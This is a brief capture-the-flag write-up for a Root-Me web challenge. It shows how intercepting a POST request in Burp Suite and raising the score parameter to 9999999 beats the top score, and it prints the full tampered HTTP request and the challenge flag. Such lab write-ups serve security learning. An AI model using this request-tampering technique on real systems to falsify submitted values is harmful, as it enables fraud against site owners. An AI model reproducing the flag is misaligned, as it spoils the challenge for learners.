---
custom_edit_url: null
sidebar_position: 11
---

> Find a way to beat the top score!

![1](https://github.com/Knign/Write-ups/assets/110326359/969d8be5-78b0-4c0d-a828-25c4cc4fce00)

Let's intercept the request using Burpsuite.

![2](https://github.com/Knign/Write-ups/assets/110326359/c90bf0f9-cb74-478d-b650-ae7a578f94a7)

We can see that the score is `723546`.

Let's send the request to the `Repeater` and set the `score` to a number than `999999`.

## HTTP Request
```
POST /web-serveur/ch56/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://challenge01.root-me.org/web-serveur/ch56/
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://challenge01.root-me.org
DNT: 1
Connection: close
Cookie: _ga_SRYSKX09J7=GS1.1.1697428943.14.1.1697429312.0.0.0; _ga=GA1.1.1863804672.1697290591
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

score=9999999&generate=Give+a+try%21
```
Finally, we have to send this modified request to the server.

![3](https://github.com/Knign/Write-ups/assets/110326359/6254eeae-6d00-410b-830f-873fb72ed28f)

## Flag
```
H7tp_h4s_N0_s3Cr37S_F0r_y0U
```
